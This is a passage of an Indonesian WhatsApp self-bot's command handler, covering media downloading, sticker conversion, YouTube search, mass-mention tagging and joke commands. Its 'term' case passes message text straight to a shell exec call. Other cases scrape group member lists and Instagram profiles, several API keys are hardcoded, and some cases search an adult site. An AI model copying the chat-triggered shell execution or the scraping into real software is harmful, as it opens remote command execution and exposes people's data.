        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        reply(`ã€Œ *SELF-MODE* ã€`);
        break;
      case "hidetag":
        if (!isGroupAdmins && !mek.key.fromMe) return reply("KHUSUS ADMIN!!");
        if (isBanned) return reply(mess.ban)
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(" ");
        var group = await syaa.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        syaa.sendMessage(from, optionshidetag, text);
        break;
      case 'playy':
        if (!isPremium) return reply(mess.prem)
case 'lagu':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
/////////////sendMediaURL(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendMediaURL(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendMediaURL(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendMediaURL(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case 'play':
  if (!isPremium) return reply(mess.prem)
              if (!q) return reply('Linknya?')
              buttons = [{buttonId: `${prefix}video ${q}`,buttonText:{displayText: `ðŸŽ¥ Video`},type:1},{buttonId:`${prefix}playyy ${q}`,buttonText:{displayText:'ðŸŽµ Mp3'},type:1}]
              imageMsg = (await syaa.prepareMessageMedia(fs.readFileSync(`./stik/fake.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/fake.jpeg`)})).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak â˜•', imageMessage: imageMsg,
              contentText:`Silahkan Pilih Media Yg Akan Di Download kak`,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
              break
case 'playyy':
  if (!isPremium) return reply(mess.prem)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://hardianto-chan.herokuapp.com/api/yt/playmp3?query=${dl_link}&apikey=hardianto`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply("Erorr")
                        }
                   break
      case 'video':   
        if (!isPremium)return reply(mess.prem)
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... ')
				acaa = args.join(" ")
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/yt/playmp4?query=${acaa}&apikey=Ikyy69`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*ã€Œ PLAY VIDEO ã€*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				syaa.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:mek, caption: 'Nih Gan'})
					break
      case "sticker":
      case "stiker":
      case "sg":
      case "s":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              syaa.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              syaa.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
      case "toimg":
        if (isBanned) return reply(mess.ban)
        if (!isQuotedSticker) return reply("ð—¥ð—²ð—½ð—¹ð˜†/ð˜ð—®ð—´ ð˜€ð˜ð—¶ð—°ð—¸ð—²ð—¿ !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, "Sukses Convert Sticker To Image");
          fs.unlinkSync(ran);
        });
        break;
        case 'toimg2':
          if (isBanned) return reply(mess.ban)
				if (!isQuotedSticker) return reply('ð—¥ð—²ð—½ð—¹ð˜†/ð˜ð—®ð—´ ð˜€ð˜ð—¶ð—°ð—¸ð—²ð—¿ !')
					reply("Loading....")
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await syaa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(ran)
						syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'ð—±ð—®?? ð—·ð—®ð—±ð—¶ '})
						fs.unlinkSync(ran)
					})
				break
      case "ytsearch":
        case "yts":
          if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Tolong masukan query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await syaa.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "ã€Œ *YOUTUBE SEARCH* ã€";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "â Title: " + video.title + "\n";
          ytresult += "â Link: " + video.url + "\n";
          ytresult += "â Durasi: " + video.timestamp + "\n";
          ytresult +=
            "â Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "â—© *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      case "setfake":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await syaa.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await syaa.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "ytmp4":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 40000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "emoji":
        case "semoji":
          if (isBanned) return reply(mess.ban)
        if (!q) return fakegroup("emojinya?\nExample : /emoji ðŸ—¿");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "ytmp3":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`);
        let isLinks = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          yta(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 30000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "image":
      case "gimage":
      case "googleimage":
        if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case "brainly":
        if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "â‰â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‰\n";
          for (let Y of res.data) {
            teks += `\n*ã€Œ _BRAINLY_ ã€*\n\n*âž¸ Pertanyaan:* ${Y.pertanyaan}\n\n*âž¸ Jawaban:* ${Y.jawaban[0].text}\nâ‰â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â‰\n`;
          }
          syaa.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;

      case "igstalk":
        if (isBanned) return reply(mess.ban)
        if (!q) return fakegroup("Usernamenya?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Following* : ${Y.followers}\n*Followers* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break;
      case "fb":
        if (isBanned) return reply(mess.ban)
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "term":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`SELF-BOT:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
      if (!isPremium) return reply(mess.prem)
        if (isBanned) return reply(mess.ban)
        try {
          
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await syaa.acceptInvite(codeInvite);
          reply("SUKSES");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "runtime":
      case "test":
        run = process.uptime();
        teks = `${kyun(run)}`;
        fakegroup(teks);
        break;
      case "speed":
      case "ping":
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          fakegroup(pingnya);
        });
        break;
      case "totag":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await syaa.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
      case "inspect":
        if (isBanned) return reply(mess.ban)
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await syaa.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          syaa.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
        //Auto respon tesy
        if (budy.includes("test")){
	         reply("memek amat gak work")
        }
             case "bot":
                  sendButMessage(from, `Iyaaa ada apa kak?ada yg bisa ${namabot} bantu?`, `Silahkan Pencet menu dibawah`, [
            {
              buttonId: `${prefix}menu`,
              buttonText: {
                displayText: `MENU`,
              },
              type: 1,
            },
          ]);
        break
if (budy.startsWith('@6289626029135')){
result = fs.readFileSync(`./strg/stiker/saya.webp`)
  syaa.sendMessage(from, result, sticker, { quoted: mek })
                  }
case "P":
      reply("Salam kak:)")
        break
if (budy.toLowerCase()==`assalamualaikum`){
if (isBan) return
reply(`Waalaikumsalam @${sender.split("@")[0]}`)
}
case "Assalamualaikum":
reply("Waalaikumsalam Wr.Wb")
break
        case "Bot":
                  sendButMessage(from, `Iyaaa ada apa kak?ada yg bisa ${namabot} bantu?`, `Silahkan Pencet menu dibawah`, [
            {
              buttonId: `${prefix}menu`,
              buttonText: {
                displayText: `MENU`,
              },
              type: 1,
            },
          ]);
        break
        //Akhir
        case 'cekwatak':
       case 'Cekwatak':
       if (!isGroup) return reply('Khusus Group')
              var namao = pushname
              var prfx = await syaa.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colkyy','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
              await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              break
                     case 'cekmati':
                     case 'Cekmati':
                     if (!isGroup) return reply(mess.only.group)
              if (!q) return reply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
case 'nekopoilatest':
                case 'Nekopoilatest':
                if (!isPremium) return reply(mess.prem)
                    get_result = await fetchJson(`https://zenzapi.xyz/api/nekopoi/latest?apikey=Katashi`)
                    get_results = get_result.result
                    ini_txt = ""
                    for (var x of get_results) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.img}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'nekopoisearch':
                case 'Nekopoisearch':
                if (!isPremium) return reply(mess.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://zenzapi.xyz/api/nekopoi/search?query=${query}&apikey=Katashi`)
                    get_results = get_result.result
                    ini_txt = ""
                    for (var x of get_results) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.img}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'nekopoisearch':
                case 'Nekopoisearch':
                if (!isPremium) return reply(mess.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
                    pee = args.join(" ")
                    get_result = await fetchJson(`https://zenzapi.xyz/api/sauce?url=${pee}&apikey=Katashi`)
                    get_results = get_result.results
                    ini_txt = ""
                    for (var x of get_results) {
                        ini_txt += `Link : ${x.url}\n`
                        ini_txt += `Site : ${x.site}\n`
                        ini_txt += `Index : ${x.index}\n`
                        ini_txt += `Similarity : ${x.similarity}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
case 'spotify':
case 'Spotify':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`https://zenzapi.xyz/api/spotify?url=${url}&apikey=Katashi`)
                    get_result = get_result.data
                    ini_txt = `Title : ${get_result.name}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Album Name : ${get_result.album_name}\n`
                    ini_txt += `Release : ${get_result.release_date}\n`
                    thumbnail = await getBuffer(get_result.cover_url)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.preview_url)
                    await syaa.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek })
                    break
case 'ytstalk':
case 'Ytstalk':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
                    query = args.join(" ")
                    reply(mess.wait)
                    get_result = await fetchJson(`https://bx-hunter.herokuapp.com/api/ytstalk?text=${query}&apikey=Ikyy69`)
                    ini_txt = `Name : ${get_result.channel}\n`
                    ini_txt += `Subscriber : ${get_result.subscriberCount}\n`
                    ini_txt += `Icon : ${get_result.thumb}\n`
                    ini_txt += `Verified : ${get_result.isVerified}\n`
